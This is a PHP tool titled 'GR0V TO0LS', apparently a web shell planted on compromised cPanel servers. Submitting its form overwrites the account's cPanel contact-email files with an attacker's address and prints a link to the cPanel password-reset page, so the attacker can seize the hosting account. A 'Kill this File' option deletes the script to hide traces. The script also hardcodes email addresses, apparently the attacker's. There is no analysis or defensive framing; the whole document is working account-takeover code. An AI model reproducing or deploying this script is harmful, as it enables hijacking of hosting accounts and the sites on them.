<?php
echo '<html>
    <head> 
	      <title>GR0V TO0LS</title>
	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		  <style>
		  	  body{
		  	  	background-color: #778899;
		  	  }
			  h1{
			  color:black;
			  font-family: Impact;
			  font-size: 38;
			  }
			  h2{
			  color:black;
			  font-family: arrial;
			  font-size: 28;
			  }
			  li {
				display: inline;
				margin: 4px;
				padding: 4px;
				color: black;
				font-family: Impact;
			}
				}
			  a {
				color: white;
				text-decoration: none;}
			  a:hover {
				color: red;
		  </style>
      	</head>
     <body>
       <center>
	  <p><h1>GR0V TO0LS</h1></p>
	<p>   
	    <form action="#" method="post">
	<input type="email" name="email" style="background-color: #00FF7F;font: 9pt tahoma;color:black;" value="bromail511@zohomail.com"/>
	<input type="submit" name="submit" value="Send" style="background-color: #00FF7F;font: 9pt tahoma;color:black;"/><br><br>
		<h2>test mail : grovhd12@gmail.com </h2><br>
		<li><a style="color: red;" href="?self=destroy"><b>Kill this File</b></a></li>
	</form>
	</p>
	</div>
   </center>
    </body>
</html>';
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactemail', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = 'http://'.$site.':2082/resetpass?start=1';
echo '<font face="Impact" color="black"><center><a href='.$parm.' target="_blank">'.$parm.'</a></center></font>';
echo '<font face="Impact" color="black"><center>'.$user.'</center></font>';
}
 elseif($_GET['self'] == 'destroy') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<h2><center><font face="Impact" color="black">File was DELETED!</center></h2>');
		else
			echo '<center><font color="red" face="Impact">Failed to DELETE File!</font></center>';
}
?>